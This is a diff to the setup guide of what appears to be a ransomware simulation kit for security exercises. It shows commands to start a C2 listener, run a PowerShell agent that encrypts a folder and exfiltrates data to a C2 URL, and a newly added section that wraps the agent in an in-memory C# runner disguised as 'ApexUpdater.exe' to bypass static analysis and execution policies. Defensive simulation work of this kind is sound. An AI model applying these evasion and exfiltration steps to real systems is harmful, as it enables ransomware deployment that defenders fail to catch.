@@ -45,11 +45,11 @@
     [A] Server Setup (Arch Linux)
 
         1. Install Dependencies:
-            pip install -r requirements.txt
+          pip install -r requirements.txt
         2. Generate Certificates:
-            openssl req -x509 -newkey rsa:4096 -keyout apex_key.pem -out apex_cert.pem -sha256 -days 365 -nodes -subj "/CN=localhost"
+          openssl req -x509 -newkey rsa:4096 -keyout apex_key.pem -out apex_cert.pem -sha256 -days 365 -nodes -subj "/CN=localhost"
         3. Start C2 Listener:
-            sudo python3 c2_server.py
+          sudo python3 c2_server.py
 
     [B] Lab Preparation (Windows Client)
 
@@ -59,10 +59,35 @@
     [C] Simulation Execution
 
         Phase 1: Impact (Encryption & Exfiltration)
-            .\ApexSim.ps1 -Mode Encrypt -C2Url "https://<YOUR_C2_IP>/api/v1/telemetry" -TargetPath "C:\SimulationData"
+          .\ApexSim.ps1 -Mode Encrypt -C2Url "https://<YOUR_C2_IP>/api/v1/telemetry" -TargetPath "C:\SimulationData"
 
         Phase 2: Recovery (Decryption)
-            .\ApexSim.ps1 -Mode Decrypt -TargetPath "C:\SimulationData"
+          .\ApexSim.ps1 -Mode Decrypt -TargetPath "C:\SimulationData"
+
+        Optional Alternative: Agent Compilation (C# Wrapper)
+          To bypass static analysis and execution policies, the PowerShell agent is wrapped in a C# runner that executes in memory.
+
+          1. **Encode the Script (Linux):**
+
+            base64 -w 0 ApexSim.ps1 > b64_script.txt
+
+          2. Prepare the Runner:
+
+            Copy the string from b64_script.txt into the encodedScript variable in ApexRunner.cs.
+
+          3. Compile (Windows CMD or Powershell):
+            
+            Locate the Compiler: Usually at C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe.
+
+            Find the DLL: You need System.Management.Automation.dll. You can usually find it in C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation\.
+
+            csc.exe /target:winexe /reference:System.Management.Automation.dll /out:ApexUpdater.exe ApexRunner.cs
+
+            Note: Ensure System.Management.Automation.dll is in the same directory during compilation.
+
+          4. Run ApexUpdater.exe
+
+          5. To Decrypt run Phase2.
 
     [D] Post-Incident Documentation
 
@@ -86,6 +111,8 @@
     | Canary Trip        | Honey-pot | [YES/NO]         | [ ]       |
     | Encryption         | T1486     | [YES/NO]         | [ ]       |
     | Internal Defacement| T1491.001 | [YES/NO]         | [ ]       |
+    | Obfuscation        | T1027     | [YES/NO]         | [ ]       |
+    | Execution          | T1059.001 | [YES/NO]         | [ ]       |
 
 5. RULES OF ENGAGEMENT (RoE) & SAFETY
 -------------------------------------
